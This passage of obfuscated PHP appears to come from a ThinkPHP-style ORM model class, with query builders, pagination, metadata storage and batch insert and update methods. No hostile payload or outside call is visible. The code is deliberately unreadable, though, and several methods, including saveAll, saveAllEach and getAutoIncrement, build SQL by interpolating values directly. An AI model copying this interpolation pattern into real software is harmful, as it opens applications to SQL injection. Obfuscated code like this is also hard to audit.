$this; } if ($–•¶ïÕ³) { $this->options[$°Ó©ù²®[357]][$°Ó©ù²®[358]] = !0; } if (is_object($ÈËÇıöõ)) { $ÈËÇıöõ = get_object_vars($ÈËÇıöõ); } if (is_string($ÈËÇıöõ)) { $…Š–òšÈ = $ÈËÇıöõ; } elseif (is_array($ÈËÇıöõ)) { if (isset($ÈËÇıöõ[0])) { $this->options[$°Ó©ù²®[357]] = array_merge($this->options[$°Ó©ù²®[357]], $ÈËÇıöõ); return $this; } else { $…Š–òšÈ = $ÈËÇıöõ; } } else { think_exception(think_lang($°Ó©ù²®[281])); } $this->options[$°Ó©ù²®[357]][] = $…Š–òšÈ; return $this; } public function cache($Ù˜ªŠ¼ = true, $¼¸ÅÆÓœ = null, $©–áñçÜ = '') { $‚”ÊÃ¤Û =& $_SERVER[Å¶¨Şêº]; if (!1 !== $Ù˜ªŠ¼) { $this->options[$‚”ÊÃ¤Û[359]] = array($‚”ÊÃ¤Û[105] => $Ù˜ªŠ¼, $‚”ÊÃ¤Û[349] => $¼¸ÅÆÓœ, $‚”ÊÃ¤Û[43] => $©–áñçÜ); } return $this; } public function field($¯­ºŒ¼, $‡áÄŒ½• = false) { $¹¯éëò =& $_SERVER[Å¶¨Şêº]; if (!0 === $¯­ºŒ¼) { $ÄÜáêş = $this->getDbFields(); $¯­ºŒ¼ = $ÄÜáêş ? $ÄÜáêş : $¹¯éëò[200]; } elseif ($‡áÄŒ½•) { if (is_string($¯­ºŒ¼)) { $¯­ºŒ¼ = explode($¹¯éëò[60], $¯­ºŒ¼); } $ÄÜáêş = $this->getDbFields(); $¯­ºŒ¼ = $ÄÜáêş ? array_diff($ÄÜáêş, $¯­ºŒ¼) : $¯­ºŒ¼; } $this->options[$¹¯éëò[283]] = $¯­ºŒ¼; return $this; } public function scope($ÀÎçÙœô = '', $œŸõÙ³Ä = NULL) { $½ªÒ¶• =& $_SERVER[Å¶¨Şêº]; if ($½ªÒ¶•[12] === $ÀÎçÙœô) { if (isset($this->_scope[$½ªÒ¶•[47]])) { $ÆÙ¥áüç = $this->_scope[$½ªÒ¶•[47]]; } else { return $this; } } elseif (is_string($ÀÎçÙœô)) { $ïÎµ‰ß = explode($½ªÒ¶•[60], $ÀÎçÙœô); $ÆÙ¥áüç = array(); foreach ($ïÎµ‰ß as $œí±œé†) { if (!isset($this->_scope[$œí±œé†])) { continue; } $ÆÙ¥áüç = array_merge($ÆÙ¥áüç, $this->_scope[$œí±œé†]); } if (!empty($œŸõÙ³Ä) && is_array($œŸõÙ³Ä)) { $ÆÙ¥áüç = array_merge($ÆÙ¥áüç, $œŸõÙ³Ä); } } elseif (is_array($ÀÎçÙœô)) { $ÆÙ¥áüç = $ÀÎçÙœô; } if (is_array($ÆÙ¥áüç) && !empty($ÆÙ¥áüç)) { $this->options = array_merge($this->options, array_change_key_case($ÆÙ¥áüç)); } return $this; } public function where($‚øİşÉ¨, $Äèñä“  = null) { $è—ö­âÈ =& $_SERVER[Å¶¨Şêº]; if (!is_null($Äèñä“ ) && is_string($‚øİşÉ¨)) { if (!is_array($Äèñä“ )) { $Äèñä“  = func_get_args(); array_shift($Äèñä“ ); } $Äèñä“  = array_map(array($this->db, $è—ö­âÈ[353]), $Äèñä“ ); $‚øİşÉ¨ = vsprintf($‚øİşÉ¨, $Äèñä“ ); } elseif (is_object($‚øİşÉ¨)) { $‚øİşÉ¨ = get_object_vars($‚øİşÉ¨); } elseif (is_array($‚øİşÉ¨)) { foreach ($‚øİşÉ¨ as $Ô ™¶ÎŠ => $‡Îüèç) { if ((is_numeric($Ô ™¶ÎŠ) || !$Ô ™¶ÎŠ) && is_string($‡Îüèç)) { if (strpos($‡Îüèç, $è—ö­âÈ[360]) === 0) { continue; } think_trace($è—ö­âÈ[361], $è—ö­âÈ[12], $è—ö­âÈ[59]); die; } } } if (is_string($‚øİşÉ¨) && $è—ö­âÈ[12] != $‚øİşÉ¨) { $Í“ï“Âµ = array(); $Í“ï“Âµ[$è—ö­âÈ[362]] = $‚øİşÉ¨; $‚øİşÉ¨ = $Í“ï“Âµ; } if (isset($this->options[$è—ö­âÈ[285]])) { $this->options[$è—ö­âÈ[285]] = array_merge($this->options[$è—ö­âÈ[285]], $‚øİşÉ¨); } else { $this->options[$è—ö­âÈ[285]] = $‚øİşÉ¨; } return $this; } public function limit($æÄÁŠ¤”, $ú³±³Ò¥ = null) { $ƒºÛçÔ• =& $_SERVER[Å¶¨Şêº]; $this->options[$ƒºÛçÔ•[302]] = is_null($ú³±³Ò¥) ? $æÄÁŠ¤” : $æÄÁŠ¤” . $ƒºÛçÔ•[60] . $ú³±³Ò¥; return $this; } public function page($Óé¨æÓŠ, $´Õˆ‰´ú = null) { $–æ³Éè =& $_SERVER[Å¶¨Şêº]; $this->options[$–æ³Éè[363]] = is_null($´Õˆ‰´ú) ? $Óé¨æÓŠ : $Óé¨æÓŠ . $–æ³Éè[60] . $´Õˆ‰´ú; return $this; } public function comment($óı÷ğ§Ş) { $this->options[$_SERVER[Å¶¨Şêº][364]] = $óı÷ğ§Ş; return $this; } public function setProperty($®èÔ©ıÄ, $İ‘áùÇˆ) { if (property_exists($this, $®èÔ©ıÄ)) { $this->{$®èÔ©ıÄ} = $İ‘áùÇˆ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\x74\54\x75\160\144\141\164\145", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\151\156\x73\x65\162\164", "\146\x75\156\x63\x74\x69\157\156")); public function setDataAuto($ÚÆ­Ôõß) { $this->dataAuto = $ÚÆ­Ôõß; } public function __construct($çğÎĞãÛ = '', $•™¥²Èô = '', $Âš²ÅŸÄ = '') { parent::__construct($çğÎĞãÛ, $•™¥²Èô, $Âš²ÅŸÄ); } protected $tableMeta = array(); protected function _beforeInsert(&$ã¯ò‰Âõ, $ı‰Ãşû‚) { $×æßüè‰ =& $_SERVER[Å¶¨Şêº]; if (!$this->checkDataAutoHas($×æßüè‰[365])) { return; } $this->dataBeforeFilter($ã¯ò‰Âõ, $×æßüè‰[365]); } protected function _beforeUpdate(&$·ñ©îØ†, $ÒÊçù‘) { $ñÍ˜“Ëş =& $_SERVER[Å¶¨Şêº]; if (!$this->checkDataAutoHas($ñÍ˜“Ëş[366])) { return; } $this->dataBeforeFilter($·ñ©îØ†, $ñÍ˜“Ëş[366]); } protected function _afterSelect(&$˜’àÚ±Í, $İ¹´§ÌŒ) { if (!is_array($˜’àÚ±Í)) { return; } if (!$this->checkDataAutoHas($_SERVER[Å¶¨Şêº][367])) { return; } foreach ($˜’àÚ±Í as &$éÂ•Ï) { $this->dataAfterFilter($éÂ•Ï); } unset($éÂ•Ï); } protected function _afterFind(&$ŠÍ¿ÃåŒ, $ µ‰‚¾Õ) { if (!is_array($ŠÍ¿ÃåŒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Å¶¨Şêº][367])) { return; } $this->dataAfterFilter($ŠÍ¿ÃåŒ); } public static function textEncode($…ØÉÎĞı) { if (!$…ØÉÎĞı) { return $…ØÉÎĞı; } $ÏôâŞÜ‚ = json_encode($…ØÉÎĞı); $ÏôâŞÜ‚ = preg_replace_callback($_SERVER[Å¶¨Şêº][368], function ($êñ¨´›¾) { return addslashes($êñ¨´›¾[0]); }, $ÏôâŞÜ‚); return json_decode($ÏôâŞÜ‚); } public static function textDecode($ô¼„½Ÿ) { $ñ±ÃÕ•ó =& $_SERVER[Å¶¨Şêº]; $Òí‘‹úì = json_encode($ô¼„½Ÿ); $Òí‘‹úì = preg_replace_callback($ñ±ÃÕ•ó[369], function ($‹Ó¤Íºˆ) { return $_SERVER[Å¶¨Şêº][108]; }, $Òí‘‹úì); return json_decode($Òí‘‹úì); } public function setAutoIncrement($¯ŸÕš) { $•Üâããñ = array($this->getPk() => $¯ŸÕš); $Ñ‘¿ÁÕŸ = $this->data($•Üâããñ)->add(); if ($Ñ‘¿ÁÕŸ) { $this->delete($Ñ‘¿ÁÕŸ); } } public function getAutoIncrement() { $ßÓ¦×Œ = $this->getTableName(); $Úèß—íÌ = $this->max($this->getPk()); $òÂˆ¬±˜ = $this->query("\163\150\x6f\167\x20\x74\x61\x62\154\145\40\x73\x74\141\x74\x75\x73\x20\x77\x68\145\162\x65\40\116\x61\x6d\145\x3d\x27{$ßÓ¦×Œ}\47"); $¨Õùøü’ = $òÂˆ¬±˜[0][$_SERVER[Å¶¨Şêº][370]]; $ßşä‚½° = max($Úèß—íÌ, $¨Õùøü’); return $ßşä‚½°; } protected function _callBefore($è±º©Äò, $Àû²±‘â) { return $this->cacheCallCheck($è±º©Äò, $Àû²±‘â, !1); } protected function _callAfter($ÙìÜóĞ¾, $Ûãé¿¿ú) { return $this->cacheCallCheck($ÙìÜóĞ¾, $Ûãé¿¿ú, !0); } protected function cacheFunctionAlias($°¿çÔŞˆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($©ƒ³úóï, $Ôº³óŞ, $²µ¸¿¿ı = false) { $¼ì—Ç©— = $this->cacheFunctionAlias($Ôº³óŞ); if (!$¼ì—Ç©—) { return; } foreach ($¼ì—Ç©— as $ëÑÃÀ– => $¦˜Ô¤¾–) { $ø²ØŞ¸ = $¦˜Ô¤¾–[0]; $×Í´œ = explode($_SERVER[Å¶¨Şêº][60], $¦˜Ô¤¾–[1]); if ($©ƒ³úóï == $ëÑÃÀ–) { return $this->cacheFunctionGet($ëÑÃÀ–, $ø²ØŞ¸); } if ($²µ¸¿¿ı && in_array($©ƒ³úóï, $×Í´œ)) { $this->cacheFunctionClear($ëÑÃÀ–, $ø²ØŞ¸); } } } public function cacheFunctionGet($ßş›»òå, $…Ÿ¦­û) { $äÍÀã“¸ = $this->cacheKeyMake($ßş›»òå, $…Ÿ¦­û); $ê· Ÿ’é = Cache::get($äÍÀã“¸); if (!is_array($ê· Ÿ’é)) { $ê· Ÿ’é = call_user_func_array(array($this, $ßş›»òå), array($…Ÿ¦­û, !0)); Cache::set($äÍÀã“¸, $ê· Ÿ’é); } return $ê· Ÿ’é; } public function cacheFunctionClear($•Á®Ñ¼Ô, $Âá‡Ìù) { $Ú¢·¶º« = $Âá‡Ìù; if (!is_array($Âá‡Ìù)) { $Ú¢·¶º« = array($Âá‡Ìù); } foreach ($Ú¢·¶º« as $áµµ¤””) { $ÚóÛˆƒ÷ = $this->cacheKeyMake($•Á®Ñ¼Ô, $áµµ¤””); Cache::remove($ÚóÛˆƒ÷); } } private function cacheKeyMake($ÑÃüøæ®, $Ó‰ıÂĞ) { $¼µØ” =& $_SERVER[Å¶¨Şêº]; return get_class($this) . $¼µØ”[11] . $ÑÃüøæ® . $¼µØ”[371] . $Ó‰ıÂĞ; } protected function selectPageReset() { $ºˆ•² =& $_SERVER[Å¶¨Şêº]; if (isset($GLOBALS[$ºˆ•²[372]])) { return; } $GLOBALS[$ºˆ•²[372]] = isset($GLOBALS[$ºˆ•²[7]][$ºˆ•²[373]]) ? $GLOBALS[$ºˆ•²[7]][$ºˆ•²[373]] : !1; $GLOBALS[$ºˆ•²[374]] = isset($GLOBALS[$ºˆ•²[7]][$ºˆ•²[363]]) ? $GLOBALS[$ºˆ•²[7]][$ºˆ•²[363]] : !1; $GLOBALS[$ºˆ•²[7]][$ºˆ•²[373]] = !1; $GLOBALS[$ºˆ•²[7]][$ºˆ•²[363]] = !1; } protected function selectPageRestore() { $é¼æ·ş™ =& $_SERVER[Å¶¨Şêº]; if (!isset($GLOBALS[$é¼æ·ş™[372]])) { return; } $GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[373]] = $GLOBALS[$é¼æ·ş™[372]]; $GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[363]] = $GLOBALS[$é¼æ·ş™[374]]; if ($GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[373]] === !1) { unset($GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[373]]); } if ($GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[363]] === !1) { unset($GLOBALS[$é¼æ·ş™[7]][$é¼æ·ş™[363]]); } unset($GLOBALS[$é¼æ·ş™[372]]); unset($GLOBALS[$é¼æ·ş™[374]]); } protected function selectPage($Ã‘€Ö’ = 200, $¬”¦‘ü = 1) { $õÈ…İéÒ =& $_SERVER[Å¶¨Şêº]; global $in; $²ì¦•ˆÍ = $this->optionsValue(); $Şğœì×õ = 50000; $Ã‘€Ö’ = isset($in[$õÈ…İéÒ[373]]) && $in[$õÈ…İéÒ[373]] ? $in[$õÈ…İéÒ[373]] : $Ã‘€Ö’; if ($Ã‘€Ö’ === -1) { $in[$õÈ…İéÒ[373]] = !1; $Şğœì×õ = 100000000; $Ã‘€Ö’ = $Şğœì×õ; } $ÚÏ¢ÛĞ… = $²ì¦•ˆÍ; $ÚÏ¢ÛĞ…[$õÈ…İéÒ[375]] = array(); $Ã‘€Ö’ = intval($Ã‘€Ö’); $Ã‘€Ö’ = $Ã‘€Ö’ <= 5 ? 5 : ($Ã‘€Ö’ >= $Şğœì×õ ? $Şğœì×õ : $Ã‘€Ö’); $¬”¦‘ü = intval(isset($in[$õÈ…İéÒ[363]]) && $in[$õÈ…İéÒ[363]] ? $in[$õÈ…İéÒ[363]] : $¬”¦‘ü); $¬”¦‘ü = $¬”¦‘ü <= 1 ? 1 : $¬”¦‘ü; $•¹¸­»» = array(); $¦ËåèåÄ = 1; if ($¬”¦‘ü == 1 && $¦ËåèåÄ) { $this->optionsValue($²ì¦•ˆÍ); $•¹¸­»» = $this->page($¬”¦‘ü, $Ã‘€Ö’)->select(); $‡Îñ…™€ = is_array($•¹¸­»») ? count($•¹¸­»») : 0; if ($‡Îñ…™€ < $Ã‘€Ö’) { $×ŒÔ•Ã‚ = 1; } else { $this->optionsValue($ÚÏ¢ÛĞ…); $‡Îñ…™€ = intval($this->count()); $×ŒÔ•Ã‚ = ceil($‡Îñ…™€ / $Ã‘€Ö’); } } else { $this->optionsValue($ÚÏ¢ÛĞ…); $‡Îñ…™€ = intval($this->count()); $×ŒÔ•Ã‚ = ceil($‡Îñ…™€ / $Ã‘€Ö’); $¬”¦‘ü = $¬”¦‘ü >= $×ŒÔ•Ã‚ ? $×ŒÔ•Ã‚ : $¬”¦‘ü; $this->optionsValue($²ì¦•ˆÍ); $•¹¸­»» = $this->page($¬”¦‘ü, $Ã‘€Ö’)->select(); } if (!is_array($•¹¸­»»)) { $•¹¸­»» = array(); } if ($×ŒÔ•Ã‚ == 1) { $‡Îñ…™€ = count($•¹¸­»»); } $ËÑ«Í¥ì = array($õÈ…İéÒ[376] => array($õÈ…İéÒ[377] => $‡Îñ…™€, $õÈ…İéÒ[373] => $Ã‘€Ö’, $õÈ…İéÒ[363] => $¬”¦‘ü, $õÈ…İéÒ[378] => $×ŒÔ•Ã‚), $õÈ…İéÒ[379] => $•¹¸­»»); return $ËÑ«Í¥ì; } protected function checkLength($¨Åª·, $Âö®ì¢£ = 0, $ëçøî¢ = '') { $çÕÍø¡Û =& $_SERVER[Å¶¨Şêº]; $Âö®ì¢£ = $Âö®ì¢£ ? $Âö®ì¢£ : 65536; if (!$¨Åª· || strlen($¨Åª·) < $Âö®ì¢£) { return; } $ëçøî¢ = $ëçøî¢ ? $ëçøî¢ . $çÕÍø¡Û[82] : $çÕÍø¡Û[12]; show_json($ëçøî¢ . LNG($çÕÍø¡Û[380]) . "\x28{$Âö®ì¢£}\51", !1); } protected function metaSet($Ğ÷²œ½, $ƒ¡óœ·Æ = null, $©‰Öàƒ¦ = null) { $Òã†Ù =& $_SERVER[Å¶¨Şêº]; if (!$this->tableMeta || !$Ğ÷²œ½) { return !1; } $§œ§åÔ‡ = $this->tableMeta[$Òã†Ù[381]]; $…á‡Ûìº = $this->tableMeta[$Òã†Ù[382]]; $¥‡¸‹´ = Model($…á‡Ûìº); $×õ÷¢ƒ‰ = array($§œ§åÔ‡ => $Ğ÷²œ½, $Òã†Ù[383] => $ƒ¡óœ·Æ); if (is_null($ƒ¡óœ·Æ)) { return $¥‡¸‹´->where(array($§œ§åÔ‡ => $Ğ÷²œ½))->delete(); } if (is_null($©‰Öàƒ¦) && is_string($ƒ¡óœ·Æ)) { return $¥‡¸‹´->where($×õ÷¢ƒ‰)->delete(); } $œé´‹„Â = is_array($ƒ¡óœ·Æ) ? $ƒ¡óœ·Æ : array(); if (is_string($ƒ¡óœ·Æ)) { $œé´‹„Â[$ƒ¡óœ·Æ] = $©‰Öàƒ¦; } $ŸÅˆéËÜ = array(); foreach ($œé´‹„Â as $êÌ×‰‹ => $­Øş×ÇË) { if (is_null($­Øş×ÇË) && is_string($êÌ×‰‹)) { $¥‡¸‹´->where(array($§œ§åÔ‡ => $Ğ÷²œ½, $Òã†Ù[383] => $êÌ×‰‹))->delete(); continue; } $this->checkLength($­Øş×ÇË, !1, $…á‡Ûìº . $Òã†Ù[4] . $êÌ×‰‹); $ŸÅˆéËÜ[] = array($§œ§åÔ‡ => $Ğ÷²œ½, $Òã†Ù[105] => $êÌ×‰‹, $Òã†Ù[384] => $­Øş×ÇË); } $Ş¾ØùïÁ = $Òã†Ù[385] . $…á‡Ûìº; CacheLock::lock($Ş¾ØùïÁ); $¥‡¸‹´->where(array($§œ§åÔ‡ => $Ğ÷²œ½))->addAll($ŸÅˆéËÜ, array(), !0); CacheLock::unlock($Ş¾ØùïÁ); return !0; } public function metaGet($³¾¶¼ÔĞ, $†ÃÅòÏ = false) { $‚™£ï¾Ş =& $_SERVER[Å¶¨Şêº]; if (!$this->tableMeta) { return array(); } $èÁè÷‡ = $this->tableMeta[$‚™£ï¾Ş[381]]; $Å†¢¢å = Model($this->tableMeta[$‚™£ï¾Ş[382]]); if ($†ÃÅòÏ) { $•Ş»Óşè = array($èÁè÷‡ => $³¾¶¼ÔĞ, $‚™£ï¾Ş[105] => $†ÃÅòÏ); return $Å†¢¢å->where($•Ş»Óşè)->getField($‚™£ï¾Ş[384]); } $•Ş»Óşè = array($èÁè÷‡ => $³¾¶¼ÔĞ); $²ÃÁ—°ƒ = $Å†¢¢å->field($‚™£ï¾Ş[386])->where($•Ş»Óşè)->select(); $²ÃÁ—°ƒ = array_to_keyvalue($²ÃÁ—°ƒ, $‚™£ï¾Ş[105], $‚™£ï¾Ş[384]); return $²ÃÁ—°ƒ; } private function checkDataAutoHas($­¼Ùáù) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ıæ‡½ª¿) { if (in_array($­¼Ùáù, explode($_SERVER[Å¶¨Şêº][60], $ıæ‡½ª¿[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¯ƒ§²öİ, $òšèÂ†ó) { $ò¡ÓÙƒ¥ =& $_SERVER[Å¶¨Şêº]; if (!is_array($¯ƒ§²öİ)) { return; } foreach ($this->dataAuto as $É÷Ü€íº) { $¡œåúªĞ = $É÷Ü€íº[0]; if (!in_array($òšèÂ†ó, explode($ò¡ÓÙƒ¥[60], $É÷Ü€íº[2]))) { continue; } switch (trim($É÷Ü€íº[3])) { case $ò¡ÓÙƒ¥[331]: case $ò¡ÓÙƒ¥[332]: $Ûè•„ò‘ = $É÷Ü€íº[1]; $øÉ¾Õ = isset($É÷Ü€íº[4]) ? (array) $É÷Ü€íº[4] : array(); if ($Ûè•„ò‘ == $ò¡ÓÙƒ¥[191] && array_key_exists($¡œåúªĞ, $¯ƒ§²öİ)) { if (!$¯ƒ§²öİ[$¡œåúªĞ]) { unset($¯ƒ§²öİ[$¡œåúªĞ]); } break; } if (isset($¯ƒ§²öİ[$¡œåúªĞ])) { array_unshift($øÉ¾Õ, $¯ƒ§²öİ[$¡œåúªĞ]); } if ($ò¡ÓÙƒ¥[331] == $É÷Ü€íº[3]) { $¯ƒ§²öİ[$¡œåúªĞ] = call_user_func_array($Ûè•„ò‘, $øÉ¾Õ); } else { $¯ƒ§²öİ[$¡œåúªĞ] = call_user_func_array(array(&$this, $Ûè•„ò‘), $øÉ¾Õ); } break; case $ò¡ÓÙƒ¥[280]: if (isset($¯ƒ§²öİ[$¡œåúªĞ]) && $¯ƒ§²öİ[$¡œåúªĞ]) { $¯ƒ§²öİ[$¡œåúªĞ] = call_user_func_array(array(&$this, $É÷Ü€íº[1]), array($¯ƒ§²öİ[$¡œåúªĞ])); } break; case $ò¡ÓÙƒ¥[283]: $¯ƒ§²öİ[$¡œåúªĞ] = $¯ƒ§²öİ[$É÷Ü€íº[1]]; break; case $ò¡ÓÙƒ¥[304]: if (isset($¯ƒ§²öİ[$¡œåúªĞ]) && !is_string($¯ƒ§²öİ[$¡œåúªĞ])) { $¯ƒ§²öİ[$¡œåúªĞ] = json_encode_force($¯ƒ§²öİ[$¡œåúªĞ]); } break; case $ò¡ÓÙƒ¥[333]: if ($¯ƒ§²öİ[$¡œåúªĞ] === $ò¡ÓÙƒ¥[12]) { unset($¯ƒ§²öİ[$¡œåúªĞ]); } break; case $ò¡ÓÙƒ¥[334]: $¯ƒ§²öİ[$¡œåúªĞ] = $É÷Ü€íº[1]; default: break; } } if ($òšèÂ†ó == $ò¡ÓÙƒ¥[365]) { $Ä÷±óÓÆ = strtolower($this->db->getDbType()); if (strpos($Ä÷±óÓÆ, $ò¡ÓÙƒ¥[23]) !== 0) { return; } $ßïíÜ›Š = $this->field(!0)->fields; $ó»ß×  = $ßïíÜ›Š[$ò¡ÓÙƒ¥[262]]; if (isset($ßïíÜ›Š[$ò¡ÓÙƒ¥[261]])) { unset($ó»ß× [$ßïíÜ›Š[$ò¡ÓÙƒ¥[261]]]); } foreach ($ó»ß×  as $‰—ÕÚ¯« => $òšèÂ†ó) { if (!isset($¯ƒ§²öİ[$‰—ÕÚ¯«])) { $¯ƒ§²öİ[$‰—ÕÚ¯«] = $ò¡ÓÙƒ¥[12]; } } } } private function dataAfterFilter(&$è·‡¿èÓ) { $ŸÄ¿¦™ü =& $_SERVER[Å¶¨Şêº]; foreach ($this->dataAuto as $äó·ê®) { $ÏçØæÁ£ = $äó·ê®[0]; if (!isset($è·‡¿èÓ[$ÏçØæÁ£])) { continue; } if (!in_array($ŸÄ¿¦™ü[367], explode($ŸÄ¿¦™ü[60], $äó·ê®[2]))) { continue; } switch (trim($äó·ê®[3])) { case $ŸÄ¿¦™ü[331]: case $ŸÄ¿¦™ü[332]: $ºêÔ£… = isset($äó·ê®[4]) ? (array) $äó·ê®[4] : array(); array_unshift($ºêÔ£…, $è·‡¿èÓ[$ÏçØæÁ£]); if (isset($äó·ê®[4]) && $äó·ê®[4] == $ŸÄ¿¦™ü[387]) { $ºêÔ£… = array($è·‡¿èÓ[$ÏçØæÁ£]); } if ($ŸÄ¿¦™ü[331] == $äó·ê®[3]) { $è·‡¿èÓ[$ÏçØæÁ£] = call_user_func_array($äó·ê®[1], $ºêÔ£…); } else { $è·‡¿èÓ[$ÏçØæÁ£] = call_user_func_array(array(&$this, $äó·ê®[1]), $ºêÔ£…); } break; case $ŸÄ¿¦™ü[280]: if (isset($è·‡¿èÓ[$ÏçØæÁ£]) && $è·‡¿èÓ[$ÏçØæÁ£]) { $è·‡¿èÓ[$ÏçØæÁ£] = call_user_func_array(array(&$this, $äó·ê®[1]), array($è·‡¿èÓ[$ÏçØæÁ£])); } break; case $ŸÄ¿¦™ü[283]: $è·‡¿èÓ[$ÏçØæÁ£] = $è·‡¿èÓ[$äó·ê®[1]]; break; case $ŸÄ¿¦™ü[304]: $ø§ïêÔı = $è·‡¿èÓ[$ÏçØæÁ£]; $è·‡¿èÓ[$ÏçØæÁ£] = json_decode($ø§ïêÔı, !0); if (is_null($è·‡¿èÓ[$ÏçØæÁ£])) { $è·‡¿èÓ[$ÏçØæÁ£] = $ø§ïêÔı; } break; case $ŸÄ¿¦™ü[333]: if ($è·‡¿èÓ[$ÏçØæÁ£] === $ŸÄ¿¦™ü[12]) { unset($è·‡¿èÓ[$ÏçØæÁ£]); } break; case $ŸÄ¿¦™ü[334]: $è·‡¿èÓ[$ÏçØæÁ£] = $äó·ê®[1]; break; default: break; } } } public function saveAll($ğï¨«éö) { $™ñ¾¦¶ =& $_SERVER[Å¶¨Şêº]; $ÇşëÍÍì = $this->tablePrefix . $this->tableName; $íü÷Ïúà = self::SQL_WHERE_IN_CHUNK; $ğï¨«éö = is_array($ğï¨«éö) ? $ğï¨«éö : array(); $òí•‡Êç = $™ñ¾¦¶[70]; $™Ê×‡” = 0; $Ù¡ì®Í = array(); $ü£‰åŞó = count($ğï¨«éö); for ($å ’¬ãÑ = 0; $å ’¬ãÑ < $ü£‰åŞó; $å ’¬ãÑ++) { $°ˆÃÔ˜ = $ğï¨«éö[$å ’¬ãÑ]; if (!is_array($°ˆÃÔ˜) || count($°ˆÃÔ˜) != 4) { continue; } $„ˆ´–ˆÛ = "\x55\120\x44\x41\x54\x45\x20\x60{$ÇşëÍÍì}\140\x20\x53\105\124\x20{$°ˆÃÔ˜[2]}\x20\75\40\x43\x41\x53\x45\x20{$°ˆÃÔ˜[0]}\x20\12"; if ($™Ê×‡” == 0) { $òí•‡Êç = $„ˆ´–ˆÛ; } $Ù¡ì®Í[] = $™ñ¾¦¶[129] . $°ˆÃÔ˜[1] . $™ñ¾¦¶[129]; $™Ê×‡”++; $òí•‡Êç .= "\40\x57\x48\x45\116\40\47{$°ˆÃÔ˜[1]}\x27\x20\124\x48\105\x4e\40\x27{$°ˆÃÔ˜[3]}\x27\40\xa"; if ($™Ê×‡” == $íü÷Ïúà || $å ’¬ãÑ == $ü£‰åŞó - 1) { $ëÙı³ñè = implode($™ñ¾¦¶[60], $Ù¡ì®Í); $òí•‡Êç .= "\40\x45\116\x44\x20\40\x57\110\105\x52\105\x20{$°ˆÃÔ˜[0]}\x20\111\116\40\x28{$ëÙı³ñè}\x29\40"; $this->execute($òí•‡Êç); $™Ê×‡” = 0; $òí•‡Êç = $„ˆ´–ˆÛ; $this->chunkEventCheck(count($Ù¡ì®Í)); $Ù¡ì®Í = array(); } } $this->chunkEventSet(); } public function saveAllEach($ûÅíĞóü) { $½ÎŠ¤õ =& $_SERVER[Å¶¨Şêº]; $ú”°Î† = $this->tablePrefix . $this->tableName; foreach ($ûÅíĞóü as $¡èÇ³çÙ) { if (!is_array($¡èÇ³çÙ) || count($¡èÇ³çÙ) != 4) { continue; } $„ä—ˆ€æ = $¡èÇ³çÙ[0] . $½ÎŠ¤õ[388] . $¡èÇ³çÙ[1] . $½ÎŠ¤õ[129]; $—¡…¦‚½ = $¡èÇ³çÙ[2] . $½ÎŠ¤õ[388] . $¡èÇ³çÙ[3] . $½ÎŠ¤õ[129]; $üìÏÄôÍ = "\165\160\144\x61\164\x65\x20{$ú”°Î†}\x20\x73\145\164\40{$—¡…¦‚½}\40\x77\x68\145\x72\145\40{$„ä—ˆ€æ}\73"; $this->execute($üìÏÄôÍ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($“¢Ò†’† = false, $…«ØÎÍÅ = false) { $this->_chunkEvent = $“¢Ò†’†; $this->_chunkEventParam = $…«ØÎÍÅ; } private function chunkEventCheck($×­üœ«„) { if (!$this->_chunkEvent) { return; } $ûÖ¢û = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ûÖ¢û[$_SERVER[Å¶¨Şêº][389]] = $×­üœ«„; Hook::trigger($this->_chunkEvent, $ûÖ¢û); } public function addAll($èƒ¤ªğ†, $™±‹ñ›Ê = array(), $®İƒËÆô = false) { $Ò°ßøÈ« =& $_SERVER[Å¶¨Şêº]; ignore_timeout(); $çú¾„ßï = self::SQL_WHERE_IN_CHUNK; if (empty($èƒ¤ªğ†)) { $this->error = think_lang($Ò°ßøÈ«[281]); return !1; } $™±‹ñ›Ê = $this->_parseOptions($™±‹ñ›Ê); foreach ($èƒ¤ªğ† as $¼É¥¿¾Ç => $‰·’™Ö’) { $èƒ¤ªğ†[$¼É¥¿¾Ç] = $this->_facade($‰·’™Ö’); $this->_beforeInsert($èƒ¤ªğ†[$¼É¥¿¾Ç], $™±‹ñ›Ê); } if (method_exists($this->db, $Ò°ßøÈ«[282])) { for ($šÑ©Ä = 0; $šÑ©Ä < count($èƒ¤ªğ†); $šÑ©Ä += $çú¾„ßï) { $ğÛŒ™ÜÉ = array_slice($èƒ¤ªğ†, $šÑ©Ä, $çú¾„ßï); if (!is_array($ğÛŒ™ÜÉ) || count($ğÛŒ™ÜÉ) == 0) { break; } $éİôö = $this->db->insertAll($ğÛŒ™ÜÉ, $™±‹ñ›Ê, $®İƒËÆô); $this->chunkEventCheck(count($ğÛŒ™ÜÉ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($èƒ¤ªğ† as $¼É¥¿¾Ç => $‰·’™Ö’) { $éİôö = $this->db->insert($‰·’™Ö’, $™±‹ñ›Ê, $®İƒËÆô); } $this->commit(); } if (!1 !== $éİôö) { $ø¢ßÈ¼Ú = $this->getLastInsID(); if ($ø¢ßÈ¼Ú) { return $ø¢ßÈ¼Ú; } } return $éİôö; } public function save($Ú×Ù‡¿Õ = '', $•ñ¥ªÓ¢ = array()) { $¯¾ÔÆ™• =& $_SERVER[Å¶¨Şêº]; $£çÒ’ãÉ = self::SQL_WHERE_IN_CHUNK; $é‡Åò¾µ = $this->optionsValue(); $Ÿ‰éÁÉ« = $this->findWhereField($é‡Åò¾µ); if (!$Ÿ‰éÁÉ«) { return parent::save($Ú×Ù‡¿Õ, $•ñ¥ªÓ¢); } $¯Ù¡ÂÃ’ = 0; $èÍËÇ¨ = 